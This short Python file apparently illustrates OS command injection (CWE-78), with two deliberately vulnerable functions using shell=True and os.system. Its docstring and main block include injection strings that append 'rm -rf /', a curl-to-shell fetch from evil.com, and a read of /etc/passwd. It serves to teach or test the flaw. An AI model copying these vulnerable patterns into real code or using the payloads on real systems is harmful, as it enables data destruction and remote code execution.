"""
VULNERABILITY: OS Command Injection (CWE-78)

User-controlled `hostname` is interpolated into a shell command executed
with shell=True. An attacker supplying:  example.com; rm -rf /
or:  example.com && curl evil.com/x.sh | sh
can execute arbitrary commands on the server with the application's
privileges.

Severity: CRITICAL
"""

import subprocess
import os


def ping_host(hostname: str) -> str:
    # ❌ VULNERABLE: shell=True + string interpolation
    result = subprocess.check_output(
        f"ping -c 1 {hostname}",
        shell=True,
    )
    return result.decode()


def list_user_dir(username: str) -> str:
    # ❌ VULNERABLE: os.system also runs through the shell
    return os.system(f"ls /home/{username}")


if __name__ == "__main__":
    # Attacker: ping_host("example.com; cat /etc/passwd")
    print(ping_host("example.com; cat /etc/passwd"))
